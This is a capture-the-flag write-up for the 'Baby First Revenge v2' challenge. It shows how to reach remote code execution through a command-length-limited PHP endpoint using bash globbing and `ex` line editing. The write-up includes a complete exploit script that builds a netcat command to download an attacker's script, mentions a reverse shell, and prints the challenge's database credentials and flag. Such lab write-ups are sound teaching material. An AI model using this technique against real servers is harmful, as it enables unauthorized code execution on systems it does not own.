# Baby First Revenge v2
**Description**: This is the hardest version! Short enough? http://52.197.41.31/

## The challenge
Visiting the URL in the challenge gives:

```php
<?php
    $sandbox = '/www/sandbox/' . md5("orange" . $_SERVER['REMOTE_ADDR']);
    @mkdir($sandbox);
    @chdir($sandbox);
    if (isset($_GET['cmd']) && strlen($_GET['cmd']) <= 4) {
        @exec($_GET['cmd']);
    } else if (isset($_GET['reset'])) {
        @exec('/bin/rm -rf ' . $sandbox);
    }
    highlight_file(__FILE__);
```

So the challenge is clear: get RCE using only 4 byte bash commands, but you have a persistent writable working directory.
There was another version of the challenge allowing up to 5 characters.
The solution described here works for that one as well of course.

One really useful thing was that it is possible to read files in your working directory by requesting `http://52.197.41.31/sandbox/HASH` where `HASH = md5("orange" + "YOURIP")`.
I used this on the 5-byte version to gather some information about the system, for example to find out that it an Ubuntu Xenial system (from output of `apt list`, which you can run using the glob technique described in the next section) .

## The exploit (or, how I came to be an EXpert)
4 characters is very little, so as a first step, we need to find a way to execute longer commands.
In bash, you can create files with `>filename`.
We can then use globs like `*` to run a command made of 4 character words. For example, we can check the environment variables:

```bash
bash:~ $ >env
bash:~ $ *>x # this runs env>x, because * expands to x
```

Also, we can use `ls` to write data into files:

```bash
bash:~ $ >abc
bash:~ $ >def
bash:~ $ ls>x # writes abc\ndef\ņx into x (note that x is included in the result of ls, because it gets created before ls runs)
```

One problem we are facing here is that the result of `ls` and `*` are both sorted according to the current locale (which appears to be C on the server), so the following wont work:

```bash
bash:~ $ >nc
bash:~ $ >-l
bash:~ $ * # does not work: expands to -l nc
```

But it is still not possible to write words longer than 3 characters, and we're going to need that if we want to connect to any server (unless you don't own a 3 letter domain :).
I got stuck at this point for a long time.
As I couldn't find any way to strip trailing newlines from files allowing me to build longer words with `cat`, I instead looked for some sort of "interpreter" that has short commands (<=3 characters) and is line based.
At first, I tried a solution involving `dc`, a stack based calculator, but as it turns out that command was not installed on the remote system.

Then I found out about `ex`. It was installed on the remote system (as it comes with `vim`) and provides a very succint language to perform editing operations on a file, exactly what we need!

With a lot of help from the `man ex`, here's how to build the command "nc 3645160312 99 > x" (3645160312 is the decimal version of my ip) to allow sending arbitrary scripts to the server (after that, you can just `sh x`, which is 4 characters, to execute any command). You can run this as a bash script:

(Note that all the ex commands need to be carefully constructed since they execute in alphabetic order, so even
if you do `>w` followed `>j`, ls will sort the result and thus `ex` receives `j` followed by `w` as input, not the other way around)
`
```bash
# create a clean working directory for demsonstration, not part of the actual exploit script
mkdir work 
cd work
export LC_ALL=C LANG=C # for correct sorting, set same locale as server

##
# stage 1: create files for the "parts" that we need
###
>nc
>36
>451
>60
>312
>999
>\>
ls>x # writes all the file names into x separated by newlines

# some debugging output, this is of course not part of the actual exploit
# x at this point contains: 312  36   451  60   999  >    nc   x (with newlines instead of spaces)
echo STAGE1 RESULT; cat x 

###
# stage 2: use ex to bring the lines into the correct order
# 
# luckily, ex ignores most invalid commands so even though our directory already contains a lot of files which
# will be included in the output of ls we can still use ls to build ex commands
###
>2j! # join the 2nd and 3rd line with space, producing 36541 (first part of ip)
>w   # save the file ("write")
ls>z # write ex commands into file z
>ex  # create the ex file for the following command
*x<z # runs ex x < z to execute `ex` on the file `x` with commands read from `z`

# note that at this point, we cannot delete the file 2j! anymore, so any further ex invocations will
# run the command 2j! as well, keep that in mind

>1m3 # move the first line (312, end of ip) to after line 3 (60, part before end of ip)
# now, 2j! is run to join the second line (312, because first line was moved) with third line (60)

# these commands indent the lines 3 (end of ip), 4 (>) and 6 (x) so that when we join them without space later, 
# there's still space between them
>3\>
>4\>
>5m0 # move 5th line (nc) to first line
>6\>

ls>z
*x<z # run ex again

echo STAGE2 RESULT; cat x

###
# stage 3: the file is now in the right order, just join them all
#
# one problem here is that we already have a lot of ex commands in our working directory,
# but we don't want to re-execute them. So we use %, which sorts before everything we've used so
# far, and applies our commands to all lines in the file. %wq saves the changes & q ensures that we quit
# and do not process any further commands

>%j! # join all lines directly, not adding additional space
>%wq # write and quit

ls>z
*x<z # run ex


echo FINAL RESULT; cat x 
```

And there it is! Now we can upload a reverse shell and see that there's a README.txt in the home directory which contains this (or something similar for v2):

```
Flag is in the MySQL database
fl4444g / SugZXUtgeJ52_Bvr
```

So just use the `mysql -ufl4444g -pSugZXUtgeJ52_Bvr` to extract the flag from the database:

**hitcon{idea_from_phith0n,thank_you:)}**

I've also uploaded the [python script](https://gist.github.com/bennofs/63ce0503c5fba9277f01d13adbe95bf6) I used to run the exploit.

**bonus**: Is it possible to construct an algorithm to automatically build the ex commands to build arbitrary commands from parts? I think it should be possible
